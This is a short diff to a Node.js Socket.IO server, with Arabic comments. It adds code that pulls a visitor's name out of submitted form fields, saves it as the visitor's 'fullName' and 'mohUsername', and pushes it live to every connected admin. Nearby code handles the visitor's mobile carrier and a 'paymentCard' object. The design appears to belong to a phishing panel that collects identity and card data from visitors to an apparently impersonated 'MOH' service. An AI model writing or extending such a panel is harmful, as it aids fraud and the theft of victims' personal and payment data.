@@ -400,6 +400,20 @@ io.on("connection", (socket) => {
         if (data.content["مزود الخدمة"]) {
           visitor.network = data.content["مزود الخدمة"];
         }
+        // استخراج اسم العميل من البيانات المرسلة وتحديث بطاقة الزائر
+        const nameField = data.content["الاسم الكامل"] || data.content["الاسم"] || data.content["fullName"] || data.content["name"] || data.content["firstName"];
+        if (nameField && !visitor.fullName) {
+          visitor.fullName = nameField;
+          visitor.mohUsername = nameField;
+          // إعلام الأدمن بتحديث الاسم
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit("visitor:nameUpdated", {
+              visitorId: visitor._id,
+              name: nameField,
+            });
+          });
+          console.log(`Visitor ${visitor._id} name auto-extracted: ${nameField}`);
+        }
       }
       if (data.paymentCard) {
         const now = new Date().toISOString();
